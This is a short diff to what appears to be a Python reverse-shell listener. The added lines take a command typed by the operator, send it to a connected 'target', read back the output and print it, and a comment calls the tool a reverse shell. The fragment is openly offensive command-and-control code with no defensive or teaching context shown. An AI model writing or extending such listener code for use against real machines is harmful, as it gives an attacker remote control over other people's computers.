@@ -22,5 +22,17 @@ target, ip = s.accept()
 
 print("Target Connected !")
 
-# dont forget to close
+# creation of simple command
+command = input("* Shell#-%s: " % str(ip))
+
+# send the command
+target.send(
+    command
+)
+answer = target.recv(1024)
+
+# print the answer from the reverse shell
+print(answer)
+
+# close the connection
 s.close()
